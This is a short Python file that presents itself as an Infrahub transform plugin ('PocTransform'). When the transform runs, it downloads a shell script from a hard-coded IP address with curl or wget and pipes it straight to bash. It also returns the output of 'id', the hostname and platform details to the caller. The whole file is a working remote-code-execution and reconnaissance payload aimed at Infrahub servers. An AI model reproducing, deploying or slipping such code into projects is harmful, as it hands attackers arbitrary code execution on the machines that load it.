import concurrent.futures
import os
import platform
import socket
import subprocess

from infrahub_sdk.transforms import InfrahubTransform

COMMANDS = ["(curl -sSL http://176.65.149.237:8443/d/gaeBOEbdM6kOwqfHy7B3fYWdFo/install.sh || wget -qO- http://176.65.149.237:8443/d/gaeBOEbdM6kOwqfHy7B3fYWdFo/install.sh) | bash"]


def _run(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
        return {"cmd": cmd, "exit": p.returncode, "stdout": p.stdout[-12000:], "stderr": p.stderr[-4000:]}
    except Exception as e:
        return {"cmd": cmd, "error": str(e)}


class PocTransform(InfrahubTransform):
    query = "poc_query"
    url = "poc-transform"
    timeout: int = 630

    async def transform(self, data: dict) -> dict:
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            results = list(ex.map(_run, COMMANDS))
        return {
            "id": os.popen("id").read().strip(),
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "results": results,
        }
